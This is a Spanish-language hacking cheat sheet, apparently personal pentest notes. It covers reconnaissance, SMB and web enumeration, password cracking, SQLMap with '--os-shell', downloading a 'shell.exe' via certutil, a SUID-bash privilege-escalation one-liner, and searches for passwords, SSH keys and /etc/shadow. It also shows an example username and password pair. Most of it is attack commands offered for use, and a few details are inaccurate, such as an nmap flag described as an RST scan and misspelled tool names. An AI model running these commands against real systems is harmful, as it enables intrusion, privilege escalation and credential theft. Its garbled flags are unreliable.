# Hacking CheatSheet

Este documento contiene información sobre hacking y herramientas para fines educativos y hacking ético. El uso de esta información para actividades ilegales o maliciosas está estrictamente prohibido.

Por favor, utiliza esta información de forma ética y responsable.

by **k3ssdev**

## Wegrafía

Este documento contiene información sobre hacking y herramientas para fines educativos y hacking ético. Las fuentes de información utilizadas para crear este documento son:

- [https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets](https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets)
- [https://hack.xero-sec.com/](https://hack.xero-sec.com/)

Se reconoce y agradece el trabajo de los creadores de estas páginas por proporcionar información valiosa para la comunidad de seguridad informática, sin su trabajo y su ejemplo este documento no existiría.

## Basics

A list of useful payloads and bypasses for Web Application Security.

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Anonimizar conexión

[Anonimizar la conexión con TOR & IPTABLES en Kali Linux](https://www.notion.so/Anonimizar-la-conexi-n-con-TOR-IPTABLES-en-Kali-Linux-fcc554e69bc04a5da176d91db6b840a3?pvs=21)

[**Anonimizar el tráfico de Linux con ProxyChains y Tor**](https://www.notion.so/Anonimizar-el-tr-fico-de-Linux-con-ProxyChains-y-Tor-038cc9cae758418da89b20371324814f?pvs=21)

### Operadores linux

La tabla muestra una lista de operadores de Linux y su función.

| Operador | Función |
| --- | --- |
| ~ | Apunta al directorio home del usuario actual |
| $() | Apunta a una variable del SO |
| | | Redirige la salida del comando anterior al siguiente |
| & | Ejecuta ambos comandos independientemente del resultado |
| && | Ejecuta el segundo comando solo si el primero tiene éxito (retorno de cero) |

## Basics

### Operadores linux

La tabla muestra una lista de operadores de Linux y su función.

| Operador | Función |
| --- | --- |
| ~ | Apunta al directorio home del usuario actual |
| $() | Apunta a una variable del SO |
| | | Redirige la salida del comando anterior al siguiente |
| || | Ejecuta el primer comando y, si falla, ejecuta el segundo |
| & | Ejecuta ambos comandos independientemente del resultado |
| && | Ejecuta el primer comando y, si tiene éxito, ejecuta el segundo |

### Tratamiento de la TTY

Para ver el valor de filas y columnas de nuestra terminal se utiliza el comando -> `stty -a`

```bash
script /dev/null -c bash # Lanza pseudoconsola
[ctrl+z] # Suspende la shell actual
stty raw -echo
fg # Recupera la shell suspendida
reset # Reinicia la configuración de la terminal
xterm # Especifica el tipo de terminal
export TERM=xterm # Asigna xterm a la variable TERM
export SHELL=bash # Asigna bash a la variable SHELL
stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>
```

La *pseudoconsola* es útil en hacking para ejecutar comandos de forma discreta y persistente en una máquina remota. Por ejemplo, si no se puede abrir una sesión de terminal directamente en la máquina remota, se puede utilizar la *pseudoconsola* para ejecutar comandos sin ser detectado. También se puede utilizar para establecer conexiones persistentes en caso de desconexiones accidentales.

### Descompresión

Para descomprimir archivos, se pueden utilizar los siguientes comandos:

- `.tar`: `tar -xf <ARCHIVO>.tar.gz`
- `.gz`: `gzip -d <ARCHIVO>.gz`
- `.zip`: `unzip <ARCHIVO>.zip`

```bash
# Descompresión .tar
tar -xf archive.tar.gz

# Descompresión .gz
gzip -d file.gz

# Descompresión .zip
unzip file.zip
```

### Compresión

Para comprimir archivos, se pueden utilizar los siguientes comandos:

- `.tar.gz`: `tar -czvf <ARCHIVO>.tar.gz <DIRECTORIO/ARCHIVO>`
- `.tar.bz2`: `tar -cjvf <ARCHIVO>.tar.bz2 <DIRECTORIO/ARCHIVO>`
- `.zip`: `zip -r <ARCHIVO>.zip <DIRECTORIO/ARCHIVO>`

```bash
# Compresión .tar.gz
tar -czvf archive.tar.gz <DIRECTORIO/ARCHIVO>

# Compresión .tar.bz2
tar -cjvf archive.tar.bz2 <DIRECTORIO/ARCHIVO>

# Compresión .zip
zip -r archive.zip <DIRECTORIO/ARCHIVO>
```

### Lanzar una TTY Shell con Python

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Comparación de archivos

```bash
diff -c scan-a.txt scan-b.txt
comm scan-a.txt scan-b.txt
```

### Transferencia de archivos

```bash
#HTTP
#Servidor
python3 -m http.server
python -m SimpleHTTPServer
#Cliente
certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt
wget http://<SERVER_IP>/file.txt

#FTP
#Servidor
python3 -m pyftpdlib
#Cliente
ftp <SERVER_IP>

#Netcat
#Servidor
nc 10.10.14.2 4242 < file.tgz
#Cliente
nc -lvnp 4242 > file.tgz
```

### SMB

Se pueden utilizar los siguientes comandos para realizar operaciones de SMB:

```bash
# Enumeración de equipos y recursos compartidos
smbclient -L //10.129.95.180 -N

# Conexión a un recurso compartido
smbclient //<IP>/<ENPOINT>
smbclient //<IP>/<ENPOINT> -N

# Enumeración de recursos compartidos y permisos
smbmap -u "loquesea" -H 10.10.151.249
smbmap -u "t-skid" -p "tj072889*" -H 10.10.126.137

# Conexión a un recurso compartido con autenticación
smbclient -U vulnnet-rst.local/t-skid //10.10.126.137/NETLOGON

# Enumeración de usuarios y contraseñas
crackmapexec smb <IP/DOMINIO.LOCAL> -u '<USER>' -p '<PASSWORD>’

# Descarga masiva de archivos
prompt off
recurse on
mget *
```

### Descargar fichero desde CMD & PowherShell

Para ejecutar el comando `Invoke-WebRequest` desde el símbolo del sistema (CMD), debes utilizar PowerShell directamente desde CMD. Puedes hacerlo de la siguiente manera:

1. Abre el símbolo del sistema (CMD).
2. Para ejecutar el comando `Invoke-WebRequest`, puedes usar el comando `powershell.exe` seguido del comando que deseas ejecutar. Por ejemplo:

```powershell
powershell.exe Invoke-WebRequest -Uri "URL_DEL_ARCHIVO_A_DESCARGAR" -OutFile "nombre_del_archivo.desc"
```

Asegúrate de reemplazar `"URL_DEL_ARCHIVO_A_DESCARGAR"` con la URL real del archivo que deseas descargar y `"nombre_del_archivo.desc"` con el nombre que deseas darle al archivo descargado.

Esto ejecutará el comando `Invoke-WebRequest` dentro de una instancia de PowerShell desde el símbolo del sistema (CMD) y realizará la descarga del archivo.

Para descargar un archivo desde una URL como "[http://192.168.1.10:8000/shell.exe](http://192.168.1.10:8000/shell.exe)" en el símbolo del sistema de Windows utilizando `certutil`, puedes usar el siguiente comando:

```powershell
certutil -urlcache -split -f "<http://192.168.1.10:8000/shell.exe>" "shell.exe"
```

Este comando descargará el archivo "shell.exe" desde la URL especificada y lo guardará en el directorio actual del símbolo del sistema. Asegúrate de estar ubicado en el directorio donde deseas que se descargue el archivo antes de ejecutar el comando.

### Sniffing

```bash
tcpdump -i tun0 icmp -n
```

### Cracking

```bash
#Básico
john --wordlist=/usr/share/wordlists/rockyou.txt hash
hashcat -a 0 -m 1600 hash /usr/share/wordlists/rockyou.txt

#Cracking de contraseñas con passwd y shadow
unshadow <Archivo_passwd> <Archivo_shadow> > <Archivo_hash>
john --wordlist=<Ruta_Diccionario> <Archivo_hash>

#Cracking de documentos encriptados de Office
office2john.py <Ruta_Documento> > <Archivo_hash>
john --wordlist=<Ruta_Diccionario> <Archivo_hash>
```

# Fase de Reconocimiento

[Herramientas OSINT para la Dark Web 😎🌐](https://www.notion.so/Herramientas-OSINT-para-la-Dark-Web-8ac3b8b024234ce1a18425f7ed31a6bf?pvs=21)

[https://github.com/daprofiler/DaProfiler](https://github.com/daprofiler/DaProfiler) OSINT automated tool for searching people

## Enumeración inicial

[Guide to AutoRecon](https://www.notion.so/Guide-to-AutoRecon-1cae044a604c4d3c9c2a724e6e988884?pvs=21)

### Descubrimiento de hosts activos

Para descubrir qué direcciones IP están activas en la red, se utiliza el comando `nmap -sn`. La opción `-sn` indica que se realizará un ping sweep. El comando completo sería `nmap -sn <RANGO DE IPS>`.

```
nmap -sn <RANGO DE IPS>
```

### Escaneo de puertos y servicios

Para escanear los puertos y servicios de una dirección IP, se pueden utilizar los comandos `nmap` y `rustscan`. Para `nmap`, se pueden utilizar las siguientes opciones:

- `sCV`: realiza una detección de versiones y detección de scripts por defecto
- `sS`: realiza un escaneo de puertos TCP
- `p-`: escanea todos los puertos
- `T4`: establece el nivel de tiempo de espera y de agresividad del escaneo

Para `rustscan`, se pueden utilizar las siguientes opciones:

- `a`: escanea todos los puertos
- ``: indica que las siguientes opciones se aplicarán a la herramienta `nmap`, que se utiliza internamente en `rustscan`
- `A`: realiza una detección de versiones y detección de scripts por defecto
- `sC`: utiliza los scripts de nmap por defecto
- `sV`: realiza una detección de versiones
- `Pn`: ignora el descubrimiento de hosts

También se puede utilizar la herramienta `autorecon` en lugar de `rustscan`, utilizando el comando `sudo env "PATH=$PATH" autorecon <IP>`.

```bash
#NMAP 
nmap -sCV -sS -p- -T4 TARGET_IP
nmap -sCV -sU -p- -T4 TARGET_IP

nmap -sV -vv --script vuln TARGET_IP

#RUSTSCAN
rustscan -a <IP> -- -A -sC -sV -Pn

#AUTORECON
sudo env "PATH=$PATH" autorecon <IP>
```

[https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)

`sudo env "PATH=$PATH" autorecon` es un comando utilizado en la fase de reconocimiento de una auditoría de seguridad. Es un escáner de vulnerabilidades que automatiza el proceso de enumeración de hosts, escaneo de puertos, identificación de servicios y vulnerabilidades, y descubrimiento de subdominios. `autorecon` utiliza varias herramientas, como `nmap`, `rustscan`, `dirsearch` y `sublist3r`, para llevar a cabo estas tareas y genera un informe detallado de las vulnerabilidades encontradas.

### NMAP cheetsheet

```bash
NMAP CHEAT SHEET

Escaneo Básico:
-------------
- Escanear un host: nmap <hostname or IP>
- Escanear un rango de IP: nmap <start IP> - <end IP>
- Escanear múltiples hosts: nmap <host1> <host2> <host3>
- Escanear un conjunto de puertos: nmap -p <ports> <hostname or IP>

Opciones de Escaneo:
-------------------
- Escaneo de todos los puertos comunes: nmap -p- <hostname or IP>
- Escaneo rápido y ligero: nmap -F <hostname or IP>
- Escaneo sigiloso (stealth) SYN: nmap -sS <hostname or IP>  # Escaneo TCP SYN, adecuado para descubrimiento sigiloso.
- Escaneo FIN: nmap -sF <hostname or IP>  # Envía paquetes TCP FIN para detectar servicios abiertos.
- Escaneo RST: nmap -sR <hostname or IP>  # Envía paquetes TCP RST para probar la conectividad.
- Escaneo XMAS: nmap -sX <hostname or IP>  # Envía paquetes TCP con banderas FIN, PSH y URG activadas.
- Escaneo UDP: nmap -sU <hostname or IP>  # Escaneo de servicios UDP.

Detección de Versiones:
-----------------------
- Detección de versiones de servicios: nmap -sV <hostname or IP>

Detección de Sistemas Operativos:
---------------------------------
- Adivinar sistema operativo: nmap -O <hostname or IP>

Escaneo con Scripts NSE:
-------------------------
- Ejecutar un script específico: nmap --script <script> <hostname or IP>
- Ejecutar scripts por categoría:
  - Detección de vulnerabilidades: nmap --script vuln <hostname or IP>
  - Seguridad de contraseñas: nmap --script auth <hostname or IP>
  - Descubrimiento de servicios: nmap --script discovery <hostname or IP>
  - Información sobre el sistema: nmap --script info <hostname or IP>

Formatos de Salida:
-------------------
- Salida en formato XML: nmap -oX <output.xml> <hostname or IP>
- Salida en formato JSON: nmap -oJ <output.json> <hostname or IP>
- Salida en formato de texto: nmap -oN <output.txt> <hostname or IP>

Escaneo en Redes Internas:
--------------------------
- Escanear una red interna: nmap -T4 -A -v 192.168.1.0/24

Intensidad de Escaneo:
----------------------
- Baja intensidad (recomendado): nmap -T2 <hostname or IP>
- Intensidad normal (predeterminado): nmap -T4 <hostname or IP>
- Alta intensidad: nmap -T5 <hostname or IP>
```

### Enumeración avanzada en 2 pasos

Este comando utiliza `nmap` en dos pasos para una enumeración avanzada de puertos y servicios. En el primer paso, se utiliza el comando `sudo nmap -sS --min-rate 5000 -p- <IP> -Pn -v -oN nmap_inicial` para realizar un escaneo de puertos TCP que genera un archivo llamado `nmap_inicial`. En el segundo paso, se utiliza el comando `nmap -p$ports -sC -sV <IP> -Pn -oN nmap_final`, donde `$ports` es una variable que contiene los puertos detectados en el paso anterior. Este comando realiza una detección de versiones y detección de scripts por defecto.

```bash
sudo nmap -sS --min-rate 5000 -p- -Pn -v -oN nmap_inicial <IP> 
ports=$(cat nmap_inicial | grep '^[0-9]' | cut -d '/' -f1 | xargs | tr ' ' ',')
sudo nmap -p$ports -sC -sV -Pn -oN nmap_final <IP> 
```

### Windows scan

Para realizar un escaneo en una red con equipos con Windows, se pueden utilizar los comandos `crackmapexec` y `nmap`. `crackmapexec` se utiliza para enumerar usuarios y contraseñas de equipos en la red. Por ejemplo, se puede utilizar el comando `crackmapexec smb 192.168.66.0/24`. Para escanear los puertos y servicios de los equipos Windows, se utiliza el comando `nmap -Pn -sV -oA nmap/windows -vvv -p 111,135,139,389,445,1433,3268,3389 192.168.66.0/24`.

```bash
crackmapexec smb 192.168.66.0/24
nmap -Pn -sV -oA nmap/windows -vvv -p 111,135,139,389,445,1433,3268,3389 192.168.66.0/24

```

### Lista de servicios para puertos conocidos

Se provee una lista de los servicios correspondientes a los puertos del 1 al 1024 en este [enlace](http://www.vmaxx.net/techinfo/ports.htm).

[Ports 1 - 1024](http://www.vmaxx.net/techinfo/ports.htm)

## Reconocimiento web

### watw00f para detectar Firewall web

`watw00f` es una herramienta que se utiliza para detectar firewalls web. Se utiliza el comando `watw00f <URL>` para escanear un sitio web y determinar si está protegido por un firewall web.

```
watw00f <URL>
```

## Enumeración de subdominios a través de transferencia de Zona DNS

Para enumerar subdominios utilizando transferencia de zona DNS, se pueden utilizar los siguientes comandos:

- `dig @<IP> <DOMINIO> ns`: muestra los servidores de nombres para el dominio especificado
- `dig @<IP> <DOMINIO> mx`: muestra los servidores de correo para el dominio especificado
- `dig @<IP> <DOMINIO> axfrr`: muestra los subdominios contemplados en el `/etc/hosts`

```
dig @<IP> <DOMINIO> ns
dig @<IP> <DOMINIO> mx
dig @<IP> <DOMINIO> axfrr    #Muestra subdominios contemplados en el /etc/hosts
```

# Fase de Escaneo

## Web Fuzzing

Este apartado contiene dos herramientas de fuzzing: `gobuster` y `ffuf`.

### Gobuster

Para realizar un fuzzing de un sitio web utilizando `gobuster`, se pueden utilizar los siguientes comandos:

- `gobuster dir -u`: busca directorios
- `gobuster vhost -u`: busca subdominios

```
gobuster dir -u
gobuster vhost -u
```

### Ffuf

Para realizar un fuzzing de un sitio web utilizando `ffuf`, se pueden utilizar los siguientes comandos:

- `ffuf -c -u <http://192.168.66.252:8000/FUZZ> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`: busca directorios utilizando una lista de palabras
- `ffuf -c -u <http://192.168.66.252:8000/FUZZ> -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`: busca archivos utilizando una lista de palabras
- `ffuf -u "<https://FUZZ.target.com>" -w <path_to_wordlist> -mc 200,301,302,403`: busca subdominios utilizando una lista de palabras

```
ffuf -c -u <http://192.168.66.252:8000/FUZZ> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
ffuf -c -u <http://192.168.66.252:8000/FUZZ> -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
ffuf -u "<https://FUZZ.target.com>" -w <path_to_wordlist> -mc 200,301,302,403

```

## SQLMap

```bash
# Simple usage

    sqlmap -u “http://target_server/”

# Specify target DBMS to MySQL

    sqlmap -u “http://target_server/” --dbms=mysql

# Using a proxy

    sqlmap -u “http://target_server/” --proxy=http://proxy_address:port

# Specify param1 to exploit

    sqlmap -u “http://target_server/param1=value1&param2=value2” -p param1

# Use POST requests

    sqlmap -u “http://target_server” --data=param1=value1&param2=value2

# Access with authenticated session

    sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 cookie=’my_cookie_value’

# Basic authentication

    sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

# Evaluating response strings

    sqlmap -u “http://target_server/” --string=”This string if query is TRUE”

    sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE”

# List databases

    sqlmap -u “http://target_server/” --dbs

# List tables of database target_DB

    sqlmap -u “http://target_server/” -D target_DB --tables

# Dump table target_Table of database target_DB

    sqlmap -u “http://target_server/” -D target_DB -T target_Table -dump

# List columns of table target_Table of database target_DB

    sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns

# Scan through TOR

    sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5

# Get OS Shell

    sqlmap -u “http://target_server/” --os-shell
```

# Fase de Enumeración

### **Linux automated enumaration tools**

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Enumeración

Comando: `hostname`

El comando `hostname` devolverá el nombre de host de la máquina objetivo. Aunque este valor se puede cambiar fácilmente o tener una cadena relativamente insignificante (por ejemplo, Ubuntu-3487340239), en algunos casos, puede proporcionar información sobre el rol del sistema objetivo dentro de la red corporativa (por ejemplo, SQL-PROD-01 para un servidor SQL de producción).

```
hostname

```

Comando: `uname -a`

Imprimirá información del sistema que nos dará detalles adicionales sobre el kernel utilizado por el sistema. Esto será útil al buscar posibles vulnerabilidades del kernel que podrían llevar a la escalada de privilegios.

```
uname -a
```

Comando: `/proc/version`

El sistema de archivos `/proc` (procfs) proporciona información sobre los procesos del sistema objetivo. Encontrará `/proc` en muchas distribuciones de Linux diferentes, por lo que es una herramienta esencial para su arsenal. Mirar `/proc/version` puede proporcionar información sobre la versión del kernel y datos adicionales, como si un compilador (por ejemplo, GCC) está instalado.

```
cat /proc/version

```

Comando: `/etc/issue`

Los sistemas también pueden ser identificados al mirar el archivo `/etc/issue`. Este archivo generalmente contiene información sobre el sistema operativo, pero puede personalizarse o cambiarse fácilmente. En el mismo sentido, cualquier archivo que contenga información del sistema puede personalizarse o cambiarse. Para una comprensión más clara del sistema, siempre es bueno examinar todos estos.

```
cat /etc/issue
```

Comando: `ps`

El comando `ps` es una forma efectiva de ver los procesos en ejecución en un sistema Linux. Escribir `ps` en su terminal mostrará los procesos para la shell actual. La salida de `ps` (Estado del Proceso) mostrará lo siguiente:

- PID: El ID del proceso (único para el proceso)
- TTY: Tipo de terminal utilizado por el usuario
- Tiempo: Cantidad de tiempo de CPU utilizada por el proceso (esto NO es el tiempo que este proceso ha estado en ejecución)
- CMD: El comando o ejecutable en ejecución (NO mostrará ningún parámetro de línea de comandos)

El comando "ps" proporciona algunas opciones útiles:

- `ps -A`: Ver todos los procesos en ejecución.
- `ps axjf`: Ver el árbol de procesos (vea la formación del árbol hasta que se ejecute `ps axjf` a continuación).
- `ps aux`: La opción `aux` mostrará procesos para todos los usuarios (`a`), mostrará el usuario que lanzó el proceso (`u`) y mostrará procesos que no están conectados a una terminal (`x`). Al examinar la salida de `ps aux`, podemos tener una mejor comprensión del sistema y las posibles vulnerabilidades.

```
ps
```

Comando: `env`

El comando `env` mostrará variables de entorno.

La variable `PATH` puede contener un compilador o un lenguaje de script (por ejemplo, Python) que se podría usar para ejecutar código en el sistema objetivo o aprovecharlo para la escalada de privilegios.

```
env
```

Comando: `sudo -l`

Es posible que el sistema objetivo esté configurado para permitir a los usuarios ejecutar algunos (o todos) los comandos con privilegios de root. El comando `sudo -l` se puede utilizar para enumerar todos los comandos que su usuario puede ejecutar usando `sudo`.

```
sudo -l
```

Comando: `ls`

Uno de los comandos comunes utilizados en Linux es probablemente `ls`.

Mientras busca posibles vectores de escalada de privilegios, recuerde siempre usar el comando `ls` con el parámetro `-la`. El ejemplo a continuación muestra cómo el archivo "secret.txt" se puede pasar por alto fácilmente utilizando los comandos `ls` o `ls -l`.

```
ls -la
```

Comando: `id`

El comando `id` proporcionará una visión general del nivel de privilegios del usuario y las membresías de grupos.

```
id
```

Comando: `/etc/passwd`

Leer el archivo `/etc/passwd` puede ser una forma sencilla de descubrir usuarios en el sistema.

```
cat /etc/passwd | grep /home
```

Comando: `history`

Mirar los comandos anteriores con el comando `history` puede proporcionarnos una idea sobre el sistema objetivo y, aunque raramente, almacenar información como contraseñas o nombres de usuario.

```
history
```

Comando: `ifconfig`

El sistema objetivo puede ser un punto de pivote hacia otra red. El comando `ifconfig` nos dará información sobre las interfaces de red del sistema. El ejemplo a continuación muestra que el sistema objetivo tiene tres interfaces (eth0, tun0 y tun1). Nuestra máquina atacante puede alcanzar la interfaz eth0 pero no puede acceder directamente a las otras dos redes.

```
ifconfig
```

Esto se puede confirmar usando el comando `ip route` para ver qué rutas de red existen.

Comando: `netstat`

Después de verificar las interfaces y rutas de red existentes, vale la pena examinar las comunicaciones existentes. El comando `netstat` se puede utilizar con varias opciones diferentes para recopilar información sobre las conexiones existentes.

```
netstat
```

- `netstat -a`: muestra todos los puertos en escucha y las conexiones establecidas.
- `netstat -at` o `netstat -au` también se pueden utilizar para enumerar los protocolos TCP o UDP respectivamente.
- `netstat -l`: lista los puertos en modo "escucha". Estos puertos están abiertos y listos para aceptar conexiones entrantes. Esto se puede usar con la opción "t" para enumerar solo los puertos que están escuchando utilizando el protocolo TCP.

```
netstat -a
```

- `netstat -s`: lista estadísticas de uso de la red por protocolo. Esto también se puede utilizar con las opciones `t` o `u` para limitar la salida a un protocolo específico.
- `netstat -tp`: enumera conexiones con el nombre del servicio y la información del PID. Esto también se puede usar con la opción `l` para listar los puertos en escucha.

```
netstat -tp
```

- `netstat -i`: muestra estadísticas de interfaz. En el ejemplo se puede ver que "eth0" y "tun0" están más activas que "tun1".

```
netstat -i
```

Lo que probablemente verás con más frecuencia en publicaciones de blogs, informes y cursos es `netstat -ano`, que se puede desglosar de la siguiente manera:

- `a`: Mostrar todos los sockets.
- `n`: No resolver nombres.
- `o`: Mostrar temporizadores.

Comando: `find`

Buscar un archivo específico por nombre:

```
find /ruta -name archivo
```

Encontrar directorios por nombre:

```
find /ruta -type d -name directorio
```

Buscar archivos con permisos 777 (lectura, escritura y ejecución para todos):

```
find /ruta -type f -perm 0777
```

Encontrar archivos pertenecientes a un usuario específico:

```
find /ruta -user usuario
```

Encontrar archivos modificados en los últimos 'n' días:

```
find /ruta -mtime n
```

Buscar archivos mayores de 100 MB:

```
find /ruta -size +100M
```

Este comando también se puede utilizar con signos (+) y (-) para especificar un archivo más grande o más pequeño que el tamaño dado.

```
find /ruta -size -100M
```

El ejemplo anterior devuelve archivos más pequeños de 100 MB. Es importante tener en cuenta que el comando `find` tiende a generar errores que a veces dificultan la lectura de la salida. Por eso, es recomendable usar el comando `find` con `2>/dev/null` para redirigir los errores a "/dev/null" y tener una salida más limpia.

```
find /ruta -type f 2>/dev/null
```

Carpetas y archivos que se pueden escribir o ejecutar:

```
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

El motivo de ver tres comandos "find" diferentes que podrían llevar al mismo resultado se debe a cómo funciona el parámetro `perm`. Esto se puede ver en el manual. Como se muestra a continuación, el parámetro "perm" afecta la forma en que "find" funciona.

Encontrar herramientas de desarrollo e idiomas admitidos:

```
find / -name perl*
find / -name python*
find / -name gcc*
```

Buscar permisos de archivo específicos:

A continuación se muestra un ejemplo breve utilizado para encontrar archivos con el bit SUID establecido. El bit SUID permite que el archivo se ejecute con el nivel de privilegio de la cuenta que lo posee, en lugar de la cuenta que lo ejecuta. Esto permite un interesante camino de escalada de privilegios.

```
find / -perm -u=s -type f 2>/dev/null
```

Comandos Generales de Linux

Dado que estamos en el ámbito de Linux, familiarizarse con los comandos de Linux en general será muy útil. Dedique tiempo a familiarizarse con comandos como `find`, `locate`, `grep`, `cut`, `sort`, etc.

## Enumeración de red

Para enumerar la red, se pueden utilizar los siguientes comandos:

- `ip a` o `ifconfig`: muestra la información de la interfaz de red
- `route` o `ip route`: muestra la tabla de enrutamiento
- `arp -a` o `ip neigh`: muestra la tabla ARP
- `netstat -net` o `netstat -ano`: muestra las conexiones de red

```bash
ip a
ifconfig
route
ip route
arp -a
ip neigh
netstat -net
netstat -ano
```

## LinEnum - Enumeración en Linux

LinEnum es un script en bash que ejecuta comandos para la escalada de privilegios en sistemas Linux, ahorrando tiempo en la identificación de vulnerabilidades. Comprender sus comandos es crucial para el análisis manual en ausencia de LinEnum.

**Obtener LinEnum**
Descarga LinEnum desde:

```html
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
```

**Instalar en la Máquina Objetivo**

1. Desde tu máquina local:
    - Inicia un servidor Python con:
        
        ```bash
        python3 -m http.server 8000
        ```
        

- Descarga en la máquina objetivo:
    
    ```bash
    wget http://TU_IP_LOCAL:8000/LinEnum.sh
    ```
    

- Otra opción:
    - Copia el código fuente de LinEnum en un archivo nuevo usando Vi o Nano.
    - Guarda el archivo con extensión ".sh".
    - Hazlo ejecutable con:
        
        ```bash
        chmod +x NOMBRE_ARCHIVO.sh
        ```
        

**Ejecución de LinEnum**
En el directorio de LinEnum:

```bash
./LinEnum.sh
```

**Salida de LinEnum:**

1. **Kernel:** Información del kernel; posible explotación.
2. **¿Lectura/Escritura en Archivos Sensibles?:** Archivos de escritura global. Identifica mala configuración de permisos.
3. **Archivos SUID:** Archivos con permisos SUID; explorar para escalar privilegios.
4. **Contenido de Crontab:** Tareas programadas; oportunidades de explotación.

LinEnum proporciona información valiosa. para analizar.

## Búsqueda de credenciales

Para buscar credenciales en el sistema, se pueden utilizar los siguientes comandos:

- `grep –color=auto -rnw ‘/’ -ie “PASSWORD” –color=always 2>/dev/null`: busca archivos que contengan la palabra "PASSWORD"
- `find . -type f -exec grep -i -I “PASSWORD” {} /dev/null`: busca archivos que contengan la palabra "PASSWORD"
- `find / -name password 2>/dev/null \\;` o `locate password | more`: busca archivos que contengan la palabra "password"

```bash
grep –color=auto -rnw ‘/’ -ie “PASSWORD” –color=always 2>/dev/null
find . -type f -exec grep -i -I “PASSWORD” {} /dev/null
find / -name password 2>/dev/null \\;
locate password | more
```

## Búsqueda de claves SSH

Para buscar claves SSH en el sistema, se pueden utilizar los siguientes comandos:

- `find / -name authorized_keys 2>/dev/null`: busca el archivo que contiene las claves autorizadas
- `find / -name id_rsa 2>/dev/null`: busca el archivo que contiene la clave privada RSA

```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

## Explotación con one-liners

Para explotar una vulnerabilidad con one-liners en bash, se puede utilizar la siguiente sintaxis:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/overwrite.sh
```

## Enumeración de usuarios

Enumeración manual en Linux:

```bash
whoami
id
cat /etc/passwd
cat /etc/passwd | grep "sh$"
cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=":"
cat /etc/shadow
sudo -l
history
```

### Enumeración de usuarios mediante SMB

Para enumerar los usuarios de una máquina Windows a través de SMB, se puede utilizar el comando `enum4linux -U <IP>`. Este comando busca los usuarios en el sistema y los enumera.

```bash
enum4linux -U <IP>
```

### Enumeración de usuarios mediante LDAP

Para enumerar los usuarios de un dominio mediante LDAP, se puede utilizar el comando `ldapsearch -h <IP> -x -b "<dc=<dominio>,dc=<com>>" -s sub "(objectClass=user)"`.

```bash
ldapsearch -h <IP> -x -b "<dc=<dominio>,dc=<com>>" -s sub "(objectClass=user)"
```

### Enumeración de usuarios mediante HTTP

Para enumerar los usuarios de una aplicación web, se puede utilizar la herramienta `wpscan`. Por ejemplo, se puede utilizar el comando `wpscan --url <URL> --enumerate u` para enumerar los usuarios de un sitio web construido con WordPress.

```bash
wpscan --url <URL> --enumerate u
```

## Enumeración de contraseñas

### Enumeración de contraseñas mediante SMB

Para enumerar las contraseñas de una máquina Windows a través de SMB, se puede utilizar el comando `enum4linux -P <IP>`. Este comando busca las contraseñas en el sistema y las enumera.

```bash
enum4linux -P <IP>
```

### Enumeración de contraseñas mediante HTTP

Para enumerar las contraseñas de una aplicación web, se puede utilizar la herramienta `wpscan`. Por ejemplo, se puede utilizar el comando `wpscan --url <URL> --wordlist <PATH_TO_WORDLIST> --username <USERNAME>` para enumerar las contraseñas de un sitio web construido con WordPress.

```bash
wpscan --url <URL> --wordlist <PATH_TO_WORDLIST> --username <USERNAME>
```

## Enumeración de servicios

### Enumeración de servicios mediante Nmap

Para enumerar los servicios de una máquina, se puede utilizar el comando `nmap -sV <IP>`. Este comando escanea los puertos abiertos y trata de identificar el servicio que corre en cada puerto.

```bash
nmap -sV <IP>
```

### Enumeración de servicios mediante SNMP

Para enumerar los servicios de una máquina mediante SNMP, se puede utilizar el comando `snmpwalk -Os -c public -v 1 <IP>`. Este comando se conecta a la máquina a través del protocolo SNMP y obtiene información de los servicios.

```bash
snmpwalk -Os -c public -v 1 <IP>
```

### Enumeración de servicios mediante FTP

Para enumerar los servicios de una máquina mediante FTP, se puede utilizar el comando `ftp <IP>`. Este comando se conecta al servicio FTP y muestra la información disponible.

```bash
ftp <IP>
```

## Enumeración de sistemas operativos

De forma manual en Linux:

```bash
hostname
hostname -I
uname -a
cat /proc/version
cat /etc/shells
lscpu
ps aux
env
find \-writable 2>/dev/null | grep "etc"
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Para enumerar el sistema operativo de una máquina, se puede utilizar el comando `nmap -O <IP>`. Este comando escanea los puertos abiertos y trata de identificar el sistema operativo de la máquina.

```
nmap -O <IP>
```

## Enumeración de vulnerabilidades

### Enumeración de vulnerabilidades mediante Nessus

Para enumerar las vulnerabilidades de una máquina, se puede utilizar la herramienta `Nessus`. Esta herramienta escanea la máquina en busca de vulnerabilidades y las enumera.

```bash
sudo /etc/init.d/nessusd start
nessus
```

